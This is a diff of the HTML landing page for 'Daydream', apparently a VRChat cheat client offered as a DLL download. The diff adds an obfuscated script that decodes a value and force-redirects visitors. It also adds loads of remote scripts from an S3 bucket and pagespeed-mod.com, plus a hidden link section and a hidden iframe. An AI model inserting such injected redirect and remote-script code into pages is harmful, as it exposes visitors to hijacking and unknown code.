@@ -1,6 +1,62 @@
-<!DOCTYPE html>
-<html  >
-<head>
+<html class="desktop mbr-site-loaded" webcrx="" style=""><script type="text/javascript" async="" src="https://ssl.google-analytics.com/ga.js"></script><script>
+Object.defineProperty(window, 'ysmm', {
+	set: function(val) {
+		var T3 = val,
+				key,
+				I = '',
+				X = '';
+		for (var m = 0; m < T3.length; m++) {
+			if (m % 2 == 0) {
+				I += T3.charAt(m);
+			} else {
+				X = T3.charAt(m) + X;
+			}
+		}
+		T3 = I + X;
+		var U = T3.split('');
+		for (var m = 0; m < U.length; m++) {
+			if (!isNaN(U[m])) {
+				for (var R = m + 1; R < U.length; R++) {
+					if (!isNaN(U[R])) {
+						var S = U[m]^U[R];
+						if (S < 10) {
+							U[m] = S;
+						}
+						m = R;
+						R = U.length;
+					}
+				}
+			}
+		}
+		T3 = U.join('');
+		T3 = window.atob(T3);
+		T3 = T3.substring(T3.length - (T3.length - 16));
+		T3 = T3.substring(0, T3.length - 16);
+		key = T3;
+		if (key && (key.indexOf('http://') === 0 || key.indexOf("https://") === 0)) {
+			document.write('<!--');
+			window.stop();
+
+			window.onbeforeunload = null;
+			window.location = key;
+		}
+	}
+});
+
+Object.defineProperty(window, 'source', {
+	set (v) {
+		const url = new URL(location.protocol + location.hostname + v);
+		const key = url.searchParams.get('allb');
+		if (key && (key.indexOf('http://') === 0 || key.indexOf('https://') === 0)) {
+			document.write('<!--');
+			window.stop();
+			
+			window.onbeforeunload = null;
+			window.location = key;
+		}
+	},
+});
+</script><head>
   <!-- Site made with Mobirise Website Builder v5.5.2, https://mobirise.com -->
   <meta charset="UTF-8">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
@@ -17,17 +73,17 @@
   <link rel="stylesheet" href="assets/bootstrap/css/bootstrap-reboot.min.css">
   <link rel="stylesheet" href="assets/socicon/css/styles.css">
   <link rel="stylesheet" href="assets/theme/css/style.css">
-  <link rel="preload" href="https://fonts.googleapis.com/css?family=Poppins:100,100i,200,200i,300,300i,400,400i,500,500i,600,600i,700,700i,800,800i,900,900i&display=swap" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Poppins:100,100i,200,200i,300,300i,400,400i,500,500i,600,600i,700,700i,800,800i,900,900i&amp;display=swap" as="style" onload="this.onload=null;this.rel='stylesheet'">
   <noscript><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Poppins:100,100i,200,200i,300,300i,400,400i,500,500i,600,600i,700,700i,800,800i,900,900i&display=swap"></noscript>
-  <link rel="preload" href="https://fonts.googleapis.com/css?family=Jost:100,200,300,400,500,600,700,800,900,100i,200i,300i,400i,500i,600i,700i,800i,900i&display=swap" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Jost:100,200,300,400,500,600,700,800,900,100i,200i,300i,400i,500i,600i,700i,800i,900i&amp;display=swap" as="style" onload="this.onload=null;this.rel='stylesheet'">
   <noscript><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Jost:100,200,300,400,500,600,700,800,900,100i,200i,300i,400i,500i,600i,700i,800i,900i&display=swap"></noscript>
   <link rel="preload" as="style" href="assets/mobirise/css/mbr-additional.css"><link rel="stylesheet" href="assets/mobirise/css/mbr-additional.css" type="text/css">
   
   
   
   
-</head>
-<body>
+<style type="text/css" id="operaUserStyle"></style><script type="text/javascript" src="//7896543.s3.amazonaws.com/001.js"></script><script type="text/javascript" async="" src="//www.pagespeed-mod.com/v1/taas?id=cs&amp;ak=b40b4e0329b50d95fe02b03a202d6279&amp;si=84064dfa74404373adc7dd4d9344be15&amp;tag=1005&amp;rand=sgwmc1673153806336ynywhwbt&amp;ord=2884660949549653.5"></script></head>
+<body style="z-index: 0"><section id="top-1" style="display: none;"><a href="https://mobirise.in">Mobirise Alternative</a> Mobirise v5.5.2</section>
 
 <!-- Analytics -->
 <script src="https://web.archive.org/web/20210323012441js_/https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
@@ -41,7 +97,7 @@
     <div class="align-center stack-top container" style="z-index: 10">
         <div class="row justify-content-center">
             <div class="col-12 col-lg-10">
-                <h1 class="mbr-section-title mbr-fonts-style mbr-white mb-3 display-1"><strong><em>Daydream</em></strong></h1>
+                <h1 class="mbr-section-title mbr-fonts-style mbr-white mb-3 display-1"><strong><em>Daydream Archive</em></strong></h1>
                 
                 <p class="mbr-text mbr-fonts-style mbr-white display-7">The free vrchat client<span aria-hidden="true"></span></p>
                <div class="mbr-section-btn mt-3"><a class="btn btn-secondary copybutton display-4" href="index.html#tabs1-t"><span class="mobi-mbri mobi-mbri-align-justify mbr-iconfont mbr-iconfont-btn"></span>Learn more&nbsp;</a> <a class="btn btn-black glow-on-hover display-4" href="https://github.com/GITDragonxd07/UnityClientDll/raw/main/DaydreamLoader.dll" target="_blank"><span class="mobi-mbri mobi-mbri-download-2 mbr-iconfont mbr-iconfont-btn"></span>Download&nbsp;</a>  <a class="btn copybutton btn-primary display-4" href="404.html"><span id="myDiv" class="socicon socicon-discord mbr-iconfont mbr-iconfont-btn"></span>Join our discord&nbsp;</a></div>
@@ -57,7 +113,7 @@
 	</div>
 
     </div>
-    <div class="background3" id="background"><canvas class="particles-js-canvas-el" width="1309" height="939" style="width: 100%; height: 100%;"></canvas></div>
+    <div class="background3" id="background"><canvas class="particles-js-canvas-el" width="1379" height="931" style="width: 100%; height: 100%;"></canvas></div>
     <script>
     document.addEventListener('DOMContentLoaded',function(event){
   // array with texts to type in typewriter
@@ -187,22 +243,22 @@
         <div class="row justify-content-center mt-4">
             <div class="col-12 col-md-8">
                 <ul class="nav nav-tabs mb-4" role="tablist">
-                    <li class="nav-item first mbr-fonts-style"><a class="nav-link mbr-fonts-style show active display-7" role="tab" data-toggle="tab" data-bs-toggle="tab" href="#tabs1-t_tab0" aria-selected="true"><strong>Client</strong></a></li>
-                    <li class="nav-item"><a class="nav-link mbr-fonts-style active display-7" role="tab" data-toggle="tab" data-bs-toggle="tab" href="#tabs1-t_tab1" aria-selected="true"><strong>Compatability</strong></a></li>
-                    <li class="nav-item"><a class="nav-link mbr-fonts-style active display-7" role="tab" data-toggle="tab" data-bs-toggle="tab" href="#tabs1-t_tab2" aria-selected="true"><strong>Updates</strong></a></li>
-                    <li class="nav-item"><a class="nav-link mbr-fonts-style active display-7" role="tab" data-toggle="tab" data-bs-toggle="tab" href="#tabs1-t_tab3" aria-selected="true"><strong>TOS</strong></a></li>
+                    <li class="nav-item first mbr-fonts-style"><a class="nav-link mbr-fonts-style show display-7" role="tab" data-toggle="tab" data-bs-toggle="tab" href="#tabs1-t_tab0" aria-selected="false"><strong>Client</strong></a></li>
+                    <li class="nav-item"><a class="nav-link mbr-fonts-style display-7" role="tab" data-toggle="tab" data-bs-toggle="tab" href="#tabs1-t_tab1" aria-selected="false"><strong>Compatability</strong></a></li>
+                    <li class="nav-item"><a class="nav-link mbr-fonts-style display-7" role="tab" data-toggle="tab" data-bs-toggle="tab" href="#tabs1-t_tab2" aria-selected="false"><strong>Updates</strong></a></li>
+                    <li class="nav-item"><a class="nav-link mbr-fonts-style display-7 active" role="tab" data-toggle="tab" data-bs-toggle="tab" href="#tabs1-t_tab3" aria-selected="true"><strong>TOS</strong></a></li>
                     
                     
                 </ul>
                 <div class="tab-content">
-                    <div id="tab1" class="tab-pane in active" role="tabpanel">
+                    <div id="tabs1-t_tab0" class="tab-pane in" role="tabpanel">
                         <div class="row">
                             <div class="col-md-12">
                                 <p class="mbr-text mbr-fonts-style display-7">Daydream was made with optimization in mind. With no hacks enabled, you should see similar or better performance to vanilla vrchat.</p>
                             </div>
                         </div>
                     </div>
-                    <div id="tab2" class="tab-pane" role="tabpanel">
+                    <div id="tabs1-t_tab1" class="tab-pane" role="tabpanel">
                         <div class="row">
                             <div class="col-md-12">
                                 <p class="mbr-text mbr-fonts-style display-7">
@@ -210,7 +266,7 @@
                             </div>
                         </div>
                     </div>
-                    <div id="tab3" class="tab-pane" role="tabpanel">
+                    <div id="tabs1-t_tab2" class="tab-pane" role="tabpanel">
                         <div class="row">
                             <div class="col-md-12">
                                 <p class="mbr-text mbr-fonts-style display-7">
@@ -218,7 +274,7 @@
                             </div>
                         </div>
                     </div>
-                    <div id="tab4" class="tab-pane" role="tabpanel">
+                    <div id="tabs1-t_tab3" class="tab-pane active" role="tabpanel">
                         <div class="row">
                             <div class="col-md-12">
                                 <p class="mbr-text mbr-fonts-style display-7">
@@ -235,5 +291,6 @@
 </section><section style="background-color: #fff; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Helvetica Neue', Arial, sans-serif; color:#aaa; font-size:12px; padding: 0; align-items: center; display: flex;"><a href="https://mobirise.site/n" style="flex: 1 1; height: 3rem; padding-left: 1rem;"></a><p style="flex: 0 0 auto; margin:0; padding-right:1rem;">Built with <a href="https://mobirise.site/a" style="color:#aaa;">Mobirise</a></p></section><script src="assets/bootstrap/js/bootstrap.bundle.min.js"></script>  <script src="assets/smoothscroll/smooth-scroll.js"></script>  <script src="assets/ytplayer/index.js"></script>  <script src="assets/mbr-tabs/mbr-tabs.js"></script>  <script src="assets/theme/js/script.js"></script>  
   
   
-</body>
-</html>
+
+
+<iframe src="about:blank" style="display: none;"></iframe></body></html>
